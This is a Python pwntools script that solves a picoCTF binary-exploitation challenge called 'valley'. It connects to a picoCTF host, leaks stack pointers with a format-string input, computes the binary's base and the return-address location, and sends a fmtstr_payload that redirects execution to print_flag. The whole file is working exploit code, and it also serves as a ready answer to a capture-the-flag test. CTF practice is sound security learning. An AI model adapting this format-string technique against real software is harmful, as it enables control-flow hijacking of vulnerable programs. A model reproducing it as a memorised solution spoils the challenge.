#! /usr/bin/python3

from pwn import *
import sys

# Makes sure we don't get annoying log lines spat out at us.
context.log_level = 'critical'

# Asks the user to enter the port since Pico updates it every 15 minutes.
port = int(input("Please enter the port: "))

# Reads in the valley executable so we can find addresses we need.  checksec=False stops some annoying text from appearing.
elf = context.binary = ELF("./valley", checksec=False)
# Initiates the remote connection.
p = remote("shape-facility.picoctf.net", port)

# Gets the 20 and 21 values off of the stack
p.sendline(b"%20$p|%21$p")
p.recvuntil(b"the distance: ")
leak = p.recvline().strip()

# Splits the output into the two values we need and subtracts stuff from them to get the correct values.
main_leak = int(leak.split(b'|')[1], 16) - 18
ret = int(leak.split(b'|')[0], 16) - 8

# Updates the elf start address to point at where the remot system's executable starts.
elf.address = main_leak - elf.sym.main

# Creates the payload.
payload = fmtstr_payload(6, {ret: elf.sym.print_flag}, write_size="short")

# Sends the payload
p.sendline(payload)
p.sendline(b"exit")

# Gets the flag from the output.
print(p.clean().strip().split(b'Here is your flag: ')[1].decode())
